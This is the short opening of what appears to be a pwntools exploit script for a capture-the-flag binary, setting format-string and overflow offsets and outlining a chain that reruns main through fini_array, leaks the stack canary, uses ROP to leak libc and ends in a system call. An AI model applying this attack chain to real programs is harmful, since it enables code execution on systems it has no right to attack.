from pwn import *
context.log_level='debug'

# bof only
CANARY_FMT_OFFSET = 39
CANARY_BOF_OFFSET = 264
RIP_BOF_OFFSET = 280

# the primary concept here is that we can force another run by overwriting the fini_array value with main to call main again.
# fini array -> leak canary, rop chain to leak libc, libc system payload
